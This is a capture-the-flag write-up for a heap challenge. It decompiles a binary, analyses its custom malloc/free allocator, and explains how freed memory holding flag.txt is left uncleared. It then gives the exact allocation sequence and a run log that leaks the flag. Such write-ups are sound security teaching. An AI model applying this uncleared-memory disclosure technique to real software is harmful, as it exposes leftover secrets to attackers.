# Writeup

## Analysing the binary in Ghidra

- Seeing the code for main, init() is called at the beginning and then after
  that the program is as seen in while running the code. There doesnt seem to be
  any scope for overflows or any unsafe functions.

- `init()` in ghidra

```cpp
void init(void)

{
  void *pvVar1;
  FILE *__stream;
  void *__ptr;
  long in_FS_OFFSET;
  int local_94;
  int local_90;
  void *apvStack104 [11];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  // allocates but this is lost because its not free
  my_malloc(0);
  local_94 = 0;
  // allocates 10 chunks of 4 bytes
  while (local_94 < 10) {
    pvVar1 = (void *)my_malloc(4);
    apvStack104[local_94] = pvVar1;
    local_94 = local_94 + 1;
  }
  // allocates 4 bytes
  pvVar1 = (void *)my_malloc(4);
  // opens the flag file
  __stream = fopen("flag.txt","r");
  // allocates 64 bytes
  __ptr = (void *)my_malloc(0x40);
  // writes the file content onto __ptr
  fread(__ptr,0x40,1,__stream);
  // frees
  my_free(__ptr);
  // closes file
  fclose(__stream);
  // another free
  my_free(pvVar1);
  local_90 = 0;
  // frees those 10 chunks
  while (local_90 < 10) {
    my_free(apvStack104[local_90]);
    local_90 = local_90 + 1;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

- To exploit this , we must understand how the memory is allocated and
  deallocated with `my_malloc` and `my_free`

```cpp
#include <cstdlib>
#include <cstring>
#include <unistd.h>

struct free_list {
  size_t size;
  char used;
  struct free_list *next;
  struct free_list *prev;
  void *data;
};

void *my_malloc(size_t block_size) {
  static struct free_list root = {
      .size = 0, .used = 1, .next = NULL, .prev = NULL, .data = NULL};
  block_size = block_size % sizeof(void *) == 0
                   ? block_size
                   : ((block_size / sizeof(void *)) + 1) * sizeof(void *);
  struct free_list *tmp = (&root)->next;
  struct free_list metadata = {
      .size = block_size, .used = 1, .next = NULL, .prev = NULL, .data = NULL};
  char *data;
  if (tmp == NULL) {
    data = (char *)sbrk(block_size + sizeof(struct free_list));
    if (data == (void *)-1) {
      return NULL;
    }
    metadata.prev = &root;
    metadata.data = data + sizeof(struct free_list);
    memcpy(data, &metadata, sizeof(struct free_list));
    memset(metadata.data, 0, block_size);
    root.next = (struct free_list *)data;
    return metadata.data;
  } else {
    struct free_list *prev = tmp->prev;
    while (tmp != NULL) {
      if (tmp->used == 0) {
        if (tmp->size >= block_size) {
          memset(tmp->data, 0, block_size);
          tmp->used = 1;
          return tmp->data;
        }
      }
      prev = tmp;
      tmp = tmp->next;
    }
    data = (char *)sbrk(block_size + sizeof(struct free_list));
    if (data == (void *)-1) {
      return NULL;
    }
    metadata.data = data + sizeof(struct free_list);
    memset(metadata.data, 0, block_size);
    metadata.prev = prev;
    memcpy(data, &metadata, sizeof(struct free_list));
    prev->next = (struct free_list *)data;
    return metadata.data;
  }
  return NULL;
}

void my_free(void *ptr) {
  if (ptr == NULL) {
    exit(255);
  }
  char *data = (char *)ptr;
  struct free_list *metadata =
      (struct free_list *)(data - sizeof(struct free_list));
  if (metadata->prev->used == 0) {
    struct free_list *metadata_prev = metadata->prev;
    metadata_prev->size += (metadata->size + sizeof(struct free_list));
    metadata_prev->next = metadata->next;
    if (metadata->next != NULL) {
      metadata->next->prev = metadata_prev;
    }
    metadata = metadata_prev;
  }
  metadata->used = 0;
  if (metadata->next != NULL) {
    if (metadata->next->used == 0) {
      metadata->size += (metadata->next->size + sizeof(struct free_list));
      metadata->next = metadata->next->next;
    }
  }
  if (metadata->next == NULL) {
    int size_to_decrease = metadata->size;
    size_to_decrease += (sizeof(struct free_list));
    metadata->prev->next = NULL;
    sbrk(-size_to_decrease);
  }
  return;
}
```

- my_malloc

  - It follows a first fit allocation policy, it searches if there's any node in
    free_list that can be alloted and if it doesnt find it it will make a sbrk
    call. Also there's always metadata which seems to be taking up 40 bytes when
    i tried running sizeof(struct free_list) from another code. Also we can see
    that it allocates in multiples of sizeof(void \*). And also it is not
    checking if block_size is 0,so trying to allocate 0 byte is absolutely
    valid. Also it sets the `block_size` bytes to zero using memset. There's a
    possibility of bug there. Lets say I'm trying to allocate 8 bytes but
    there's a node in free_list which is not used and it has size greater than
    block_size, then what this will do is just zero out the first `block_size`
    bytes not the entire block and return it to the callee. There could be some
    old data in that uncleared memory location which is bad. If I'm asking for 0
    byte to be allocated it will allocate (40+0) bytes and return the pointer to
    me. This wont clear any of the memory as calling memset wont do anything.

- my_free

  - This decrements the ptr so that it points to the metadata of the given
    pointer. Sets the used filed to 0 and then tries to merge it with a block
    before it if it is also unused. It tries to do the same thing with block
    next to it. If however the block next to it is NULL, it returns the memory
    back by decrementing with sbrk. So if contiguous memory is freed, it will be
    returned back and wont be accessible from the free_list that is maintained
    in my_malloc.
  - Also sbrk actually allocates in pages of memory, so when I do `sbrk(4)` it
    will actually fetch a page of memory but still the pointer will be pointing
    4 above the previous base break location. `sbrk` when it has to fetch a new
    page will zero out the whole page of memory but it wont do that if we
    already have a page and we are just decrementing and incrementing the sbrk
    while staying within the page size.

- Memory not zeroed out by sbrk

```c
// allocates a new page here (mostly aroung 4096 bytes but can be different)
int *a = sbrk(4);
// withing that page still
int *b = sbrk(4);
*b = 1;
// still within the page
sbrk(-4);
b = sbrk(4);
printf("%d", *b); // this will print 1
```

- Memory is zeroed out by sbrk

```c
// allocates a new page here (mostly aroung 4096 bytes but can be different)
int *a = sbrk(4);
*a = 1;
// back to previous page
sbrk(-4);
// again a new page allocated and hence memory is zeroed out
a = sbrk(4);
printf("%d", *a); // this will print 0
```

- In the init() function, we can see that the page wont be returned because of
  the unfreed allocation at the beginning. So basically that causes sbrk to stay
  within the page, but everuything that was freed is not there in the free_list.

  root -> lost_mem sbrk(0)

                    ^
                    |

- So inside the init() call, it allocated 10 \* (40+8) bytes and then another
  40+8 bytes then 40+64 bytes and then freed all of those while staying within
  in page allocated initially. So if we can allocate 528 bytes and after that
  one byte we will be exactly pointing to the data that read flag.txt. But I
  also need to be careful that there's only 10 turns and at max I can allocate
  40(for metadata)+32 bytes. We need one of those ten turns to print the data as
  well. We can do that with following allocations and always saving them in
  different indices so that none of it is freed and to get the desired
  behaviour.

  - Allocate 32 bytes 6 times = (40+32)\*6 bytes= 432 bytes
  - Allocate 0 byte = 40+0 bytes
  - Allocate 16 bytes = 40+16 bytes = 56 bytes (Totals 432+56+40=528 bytes by
    now)
  - Allocate 0 bytes now = 40+0 bytes and now we are exactly pointing to the
    string that read the flag. Had we done non zero byte allocation here, the
    flag wouldve been erased by memset call in my_malloc
  - We print the index we last allocated to and we have our flag

- Input to get the flag

```
1
32
0
abcd
1
32
1
abcd
1
32
2
abcd
1
32
3
abcd
1
32
4
abcd
1
32
5
abcd
1
0
6
1
16
7
abcd
1
0
8
3
8
```

```bash
Turn number 1
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 32
What index should the allocation reside in?(0<=index<=9) :0
Enter the contents at index 0 : abcd
Turn number 2
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 32
What index should the allocation reside in?(0<=index<=9) :1
Enter the contents at index 1 : abcd
Turn number 3
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 32
What index should the allocation reside in?(0<=index<=9) :2
Enter the contents at index 2 : abcd
Turn number 4
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 32
What index should the allocation reside in?(0<=index<=9) :3
Enter the contents at index 3 : abcd
Turn number 5
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 32
What index should the allocation reside in?(0<=index<=9) :4
Enter the contents at index 4 : abcd
Turn number 6
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 32
What index should the allocation reside in?(0<=index<=9) :5
Enter the contents at index 5 : abcd
Turn number 7
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 0
What index should the allocation reside in?(0<=index<=9) :6
Enter the contents at index 6 : Turn number 8
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 16
What index should the allocation reside in?(0<=index<=9) :7
Enter the contents at index 7 : abcd
Turn number 9
1) Allocate
2) Free
3) Print at index
4) Exit
1
How many bytes?(Max 32 allowed) : 0
What index should the allocation reside in?(0<=index<=9) :8
Enter the contents at index 8 : Turn number 10
1) Allocate
2) Free
3) Print at index
4) Exit
3
Index to be printed? : 8
p_ctf{1ve_n0_m0r3_f1a95_2_g1v3}


```
